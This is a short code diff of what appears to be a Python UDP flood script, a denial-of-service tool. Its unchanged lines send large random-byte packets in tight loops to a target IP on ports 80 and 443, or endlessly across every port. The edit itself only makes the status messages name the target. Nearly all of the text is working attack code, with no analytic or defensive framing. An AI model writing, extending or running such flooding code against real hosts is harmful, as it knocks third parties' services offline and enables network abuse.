@@ -17,9 +17,9 @@ if __name__ == "__main__":
             for i in range(1, 50000):
                 sock.sendto(random._urandom(4096), (args.ip, 80))
                 sock.sendto(random._urandom(4096), (args.ip, 443))
-            print(f"Packages sent!")
+            print(f"Packages sent to {args.ip} on ports 80 and 443!")
     else:
         while True:
             for i in range(1, 65536):
                 sock.sendto(random._urandom(4096), (args.ip, i))
-            print(f"Packages sent!")
+            print(f"Packages sent to {args.ip}!")
